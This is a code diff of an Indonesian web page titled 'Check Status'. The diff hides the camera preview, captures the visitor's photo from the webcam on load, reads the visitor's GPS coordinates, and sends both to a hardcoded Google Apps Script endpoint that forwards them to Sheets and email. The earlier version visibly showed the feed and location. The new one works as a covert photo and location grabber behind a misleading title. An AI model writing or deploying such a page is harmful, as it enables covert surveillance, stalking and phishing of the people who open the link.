@@ -3,92 +3,49 @@
 <head>
   <title>Cek Status</title>
   <style>
-    body {
-      font-family: sans-serif;
-      text-align: center;
-      padding: 20px;
-    }
-    video, canvas {
-      width: 100%;
-      max-width: 400px;
-      margin-bottom: 10px;
-    }
+    video, canvas { max-width: 100%; display: none; }
+    body { text-align: center; font-family: sans-serif; padding: 20px; }
   </style>
 </head>
 <body>
 
-  <h2>📸 Ambil Foto & Lokasi</h2>
+<h2>📸 Mengambil Foto & Lokasi...</h2>
+<video id="video" autoplay muted playsinline></video>
+<canvas id="canvas" width="400" height="300"></canvas>
 
-  <video id="video" autoplay playsinline></video><br>
-  <canvas id="canvas" width="400" height="300" style="display:none;"></canvas>
+<script>
+const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbzF2Wr7e7UO0OehFJgn-07FDzIPpbPbRe7bpkAcwBEVBfT5Rq6KGqd4kGe8souaJZGFWw/exec"; // Ganti dengan Web App kamu
 
-  <p><strong>Lokasi Anda:</strong> <span id="location">Mengambil lokasi...</span></p>
+async function init() {
+  const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+  const video = document.getElementById('video');
+  video.srcObject = stream;
 
-  <script>
-    const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbxrrRsGjbX0hgv4vKlKOlnfO1YT-RdjYiJsmi3cR3ohTzelijRZCo65G4x_fCbhchC2Mw/exec";
+  navigator.geolocation.getCurrentPosition(async (pos) => {
+    const { latitude, longitude } = pos.coords;
 
-    async function startCamera() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        document.getElementById('video').srcObject = stream;
-        setTimeout(captureAndSend, 3000);
-      } catch (err) {
-        alert('Gagal akses kamera: ' + err.message);
-      }
-    }
-
-    function getLocation(callback) {
-      navigator.geolocation.getCurrentPosition(
-        pos => {
-          const { latitude, longitude } = pos.coords;
-          document.getElementById('location').textContent = `${latitude}, ${longitude}`;
-          callback({ latitude, longitude });
-        },
-        err => {
-          document.getElementById('location').textContent = 'Gagal ambil lokasi.';
-          callback(null);
-        }
-      );
-    }
-
-    function captureAndSend() {
-      const video = document.getElementById('video');
+    // Tunggu 2 detik lalu jepret
+    setTimeout(() => {
       const canvas = document.getElementById('canvas');
       const ctx = canvas.getContext('2d');
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      const imageData = canvas.toDataURL('image/png');
+      const image = canvas.toDataURL('image/png');
 
-      getLocation(location => {
-        if (!location) return;
+      fetch(WEB_APP_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ latitude, longitude, image })
+      }).then(res => res.text()).then(msg => {
+        alert("✅ Terkirim ke Google Sheets dan email!");
+        stream.getTracks().forEach(track => track.stop()); // Matikan kamera
+      }).catch(err => alert("❌ Gagal: " + err.message));
+    }, 2000);
+  }, err => {
+    alert("Gagal ambil lokasi: " + err.message);
+  });
+}
 
-        const data = {
-          latitude: location.latitude,
-          longitude: location.longitude,
-          image: imageData
-        };
-
-        fetch(WEB_APP_URL, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify(data)
-        })
-        .then(res => res.text())
-        .then(result => {
-          alert("✅ Data terkirim ke Sheets & Email: " + result);
-        })
-        .catch(err => {
-          alert("❌ Gagal kirim data: " + err.message);
-        });
-      });
-    }
-
-    window.onload = () => {
-      startCamera();
-      getLocation(() => {});
-    };
-  </script>
-
+window.onload = init;
+</script>
 </body>
 </html>
